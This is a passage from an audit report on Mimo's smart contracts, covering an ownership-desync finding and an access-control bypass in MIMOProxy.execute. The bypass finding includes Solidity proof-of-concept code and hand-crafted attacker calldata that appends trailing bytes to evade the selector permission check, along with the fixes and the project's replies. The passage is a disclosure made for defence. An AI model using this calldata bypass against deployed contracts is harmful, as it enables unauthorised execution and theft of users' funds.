13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78\">[H-03] Registry.sol fails to deliver expected functionality</a></h2>\n<p><em>Submitted by byndooa, also found by arcoun, cccz, Lambda, and thebensams</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The description of Registry.sol is following:</p>\n<p>/// Deploys new proxies via the factory and keeps a registry of owners to proxies. Owners can only\n/// have one proxy at a time.\nBut it is not.\nThere are multiple problems:</p>\n<ol>\n<li>Proxy owner can change and will not be registered</li>\n<li>There many ways for an owner to have many proxies:</li>\n<li>A few other proxy owners transferOwnership() to one address.</li>\n<li>Registry tracks last deployments and does not guarantee ownership.</li>\n<li>Factory.sol allows calling deployFor() to anyone, without any checks and registrations.</li>\n</ol>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59</a></p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Delete <code>Proxy.transfetOwnership()</code>.</p>\n<p>Disallow anyone to call <code>deploy()</code> and <code>deployFor()</code> in <code>Factory()</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78#issuecomment-1210585639\">RnkSngh (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We agree that this is an issue and intend to fix this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78#issuecomment-1221553605\">gzeoneth (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>I believe this is High Risk due to the unexpected ownership behavior.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78#issuecomment-1223658600\">m19 (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>While the Registry indeed does not work as advertised, I am not sure if high risk is the correct here? As per <a href=\"https://docs.code4rena.com/awarding/judging-criteria#estimating-risk\">the definition</a> “Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).” I don’t think that applies here.</p>\n<p>We also see no way <code>Proxy owner can change and will not be registered</code> actually can happen which would be the only scenario there is a loss of funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78#issuecomment-1223956313\">gzeoneth (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I am quite sure asset can be lost if the owner cannot do owner stuff and a non-owner can do owner stuff. Also see related PoC in e.g. <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/154\">#154</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/67\">#67</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/69\">#69</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/78#issuecomment-1224011441\">m19 (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>@gzeoneth Thanks, I get it now, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/154\">#154</a> describes it much better. Yes, this is definitely a high-risk issue then.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that both <code>MIMOProxy</code> and <code>MIMOProxyRegistry</code> stored proxy ownership data, but ownership transfers were not propagated from <code>MIMOProxy</code> to the <code>MIMOProxyRegistry</code>. This would cause new owners to lose access to vault funds and old owners to retain privileged access to automation configuration.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team removed the <code>owner</code> state variable and <code>transferOwner</code> function from <code>MIMOProxy</code>. Additionally, they removed <code>MIMOProxyRegistry</code> altogether and moved its functionality to <code>MIMOProxyFactory</code>. Ownership data is now stored only in <code>MIMOProxyFactory</code>, and all ownership transfers must now be performed by calling <code>MIMOProxyFactory#transferOwnership</code> rather than interacting with <code>MIMOProxy</code>.</p>\n</blockquote>\n<blockquote>\n<p><code>MIMOProxyFactory</code> now stores <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L20\">a mapping</a> of proxy address to <code>ProxyState</code>, a struct that includes the current owner address. The <code>claimOwnership</code> function updates both <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L105\">the owner address</a>  and the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxyFactory.sol#L104\">current proxy</a> when a new user accepts ownership. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L89\">unit test</a> demonstrates this behavior.</p>\n</blockquote>\n<blockquote>\n<p>An <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/51a3092e4dd62f36de8fb16d15f5dec756cc9ae0/test/02_integration/proxy/MIMOProxyGuard.test.ts\">integration test</a> demonstrates that proxy permissions are cleared after ownership transfers.</p>\n</blockquote>\n<blockquote>\n<p>In its authorization check in the <code>execute</code> function, <code>MIMOProxy</code> <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxy.sol#L38\">reads from the proxy factory</a> to determine the <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/contracts/proxy/MIMOProxy.sol#L41\">current owner address</a>. Client contracts <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOEmptyVault.sol#L74\">MIMOEmptyVault</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMOLeverage.sol#L79\">MIMOLeverage</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/MIMORebalance.sol#L76\">MIMORebalance</a>, <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/automated/MIMOAutoAction.sol#L37\">MIMOAutoAction</a>, and <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5186ef4be23f9dda81c8474096edb1f0594d70c3/contracts/actions/managed/MIMOManagedAction.sol#L36\">MIMOManagedAction</a> now read the current proxy from <code>MIMOProxyFactory</code>. </p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since <code>MIMOProxyFactory</code> is now the single source of truth for <code>MIMOProxy</code> ownership, this data cannot fall out of sync across contracts. Since client contracts call <code>MIMOProxyFactory#getCurrentProxy</code>, they will correctly read the current proxy address.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute\" style=\"position:relative;\"><a href=\"#h-04-incorrect-implementation-of-access-control-in-mimoproxyexecute\" aria-label=\"h 04 incorrect implementation of access control in mimoproxyexecute permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159\">[H-04] Incorrect implementation of access control in MIMOProxy:execute</a></h2>\n<p><em>Submitted by vlad_bochok</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L54\">https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L54</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104\">https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104</a></p>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>There is a function <code>execute</code> in <code>MIMOProxy</code> smart contract. The function performs a delegate call to the user-specified address with the specified data. As an access control, the function checks that either it was called by the owner or the owner has previously approved that the sender can call a specified target with specified calldata. See <a href=\"https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104\">https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104</a>.</p>\n<p>The check itself:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (owner != msg.sender) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      bytes4 selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        selector := calldataload(data.offset)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (!_permissions[msg.sender][target][selector]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The problem is how the <code>selector</code> is calculated. Specifically, <code>calldataload(data.offset)</code> - reads first 4 bytes of <code>data</code>.  Imagine <code>data.length == 0</code>, does it mean that <code>calldataload(data.offset)</code> will return <code>bytes4(0)</code>? No.</p>\n<p>Let’s see how calldata are accepted by functions in Solidity. The solidity function checks that the calldata length is less than needed, but does NOT check that there is no redundant data in calldata. That means, the function <code>execute(address target, bytes calldata data)</code> will definitely accept data that have <code>target</code> and <code>data</code>, but also in calldata can be other user-provided bytes. As a result,  <code>calldataload(data.offset)</code> can read trash, but not the <code>data</code> bytes.</p>\n<p>And in the case of <code>execute</code> function, an attacker can affect the execution by providing <code>trash</code> data at the end of the function. Namely, if the attacker has permission to call the function with some <code>signature</code>, the attacker can call proxy contract bypass check for signature and make delegate call directly with zero calldata.</p>\n<p>Please see proof-of-concept (PoC), <code>getAttackerCalldata</code> returns a calldata with which it is possible to bypass check permission for signature. Function <code>execute</code> from PoC simulate check for permission to call <code>signatureWithPermision</code>, and enforce that <code>data.length == 0</code>. With calldata from <code>getAttackerCalldata</code> it works.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Any account that has permission to call at least one function (signature) to the contract can call fallback function without permission to do so.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT OR Apache-2.0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IMIMOProxy {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event Execute(address indexed target, bytes data, bytes response);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  event TransferOwnership(address indexed oldOwner, address indexed newOwner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function initialize() external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function getPermission(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address envoy,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address target,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes4 selector</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external view returns (bool);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function owner() external view returns (address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function minGasReserve() external view returns (uint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function execute(address target, bytes calldata data) external payable returns (bytes memory response);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function setPermission(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address envoy,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address target,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes4 selector,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool permission</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function transferOwnership(address newOwner) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function multicall(address[] calldata targets, bytes[] calldata data) external returns (bytes[] memory);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract PoC {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bytes4 public signatureWithPermision = bytes4(0xffffffff);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Call this function with calldata that can be prepared in `getAttackerCalldata`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function execute(address target, bytes calldata data) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes4 selector;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assembly {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            selector := calldataload(data.offset)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(selector == signatureWithPermision);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(data.length == 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Function that prepare attacker calldata</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getAttackerCalldata() public view returns(bytes memory)  {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes memory usualCalldata = abi.encodeWithSelector(IMIMOProxy.execute.selector, msg.sender, new bytes(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return abi.encodePacked(usualCalldata, bytes32(signatureWithPermision));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add <code>require(data.length >= 4);</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1210479234\">RayXpub (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>We were not able to recreate the provided POC. The explanation is also incomplete - we don’t see how an attacker could bypass the permissions check through providing extra calldata in a signature. Please provide more details, or a working POC, on how the extra data can bypass the permissions check.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1221562576\">gzeoneth (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This POC looks valid to me.</p>\n<p>Basically what the warden mean is if you construct the calldata like execute(some_addr, \"\") + 0xffffff</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">0x1cff79cd0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000^ffffffff</span></span></code></pre>\n<p><code>data.offset</code> would be at ^<br>\nand <code>calldataload(data.offset)</code> would read 0xffffff</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/159#issuecomment-1222005782\">gzeoneth (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This might be clearer</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PoC</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signatureWithPermision</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">bytes4</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0xdead1337</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Call this function with calldata that can be prepared in `getAttackerCalldata`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">selector</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">assembly</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            selector := </span><span class=\"mtk11\">calldataload</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offset</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">selector</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">signatureWithPermision</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;bad 